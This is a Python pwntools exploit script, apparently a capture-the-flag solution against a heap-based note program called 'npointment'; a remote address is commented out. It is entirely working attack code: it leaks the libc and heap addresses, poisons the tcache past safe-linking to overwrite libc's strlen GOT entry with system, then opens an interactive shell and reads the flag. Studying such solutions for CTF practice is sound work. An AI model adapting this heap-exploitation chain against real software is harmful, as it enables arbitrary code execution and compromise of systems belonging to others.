from pwn import *
context(arch='amd64', os='linux', log_level='debug')
s=process("./npointment")
#s=remote("8.130.35.16",58001)
libc=ELF("../dist/libc.so.6")

def add(content):
    s.sendlineafter(b"$ ",b"add content="+content)

def show():
    s.sendlineafter(b"$ ",b"show aaa")

def delete(idx):
    s.sendlineafter(b"$ ",b"delete index="+str(idx).encode())

if __name__=="__main__":
    pause()
    add(b"A"*0x40)
    add(b"A"*0x40)
    add(b"A"*0x40)
    add(b"A"*0x40)
    add(b"A"*0x40)
    add(b"A"*0x40)
    add(b"A"*0x40)
    add(b"\x21"*0x2d0)
    add(b"A"*0x40)
    show()
    delete(0)
    add((b"event=event=").ljust(0x40,b"a")+b"\x00"*(0xe+7)+flat([
        0,0x471,
    ]))
    delete(2)
    add(b"a"*0x40)
    add(b"a"*0x500)
    show()
    s.recvuntil(b"#3:")
    s.recvuntil(b"Content: ")
    libc.address=u64(s.recv(6).ljust(8,b"\x00"))-(0x7fc5ee65f0f0-0x7fc5ee460000)
    success(hex(libc.address))

    add(b"a"*0x50)
    delete(0xa)
    show()
    s.recvuntil(b"#3:")
    s.recvuntil(b"Content: ")
    heap_xor_key=u64(s.recvline()[:-1].ljust(8,b"\x00"))
    heap_base=heap_xor_key<<12
    success(hex(heap_base))

    pause()
    strlen_got=libc.address+0x1fe080
    add(b"a"*0x50)
    delete(6)
    delete(2)
    delete(0)
    add((b"event=event=").ljust(0x40,b"a")+b"\x00"*(0xe+7+0x10)+flat([
        (strlen_got-0x40)^heap_xor_key
    ])+b"\x00\x00")
    add(b"A"*0x40)
    add(b"A"*0x40+p64(libc.sym["system"])[:6])
    add(b"/bin/sh\x00")
    s.sendline(b"cat flag")
    s.interactive()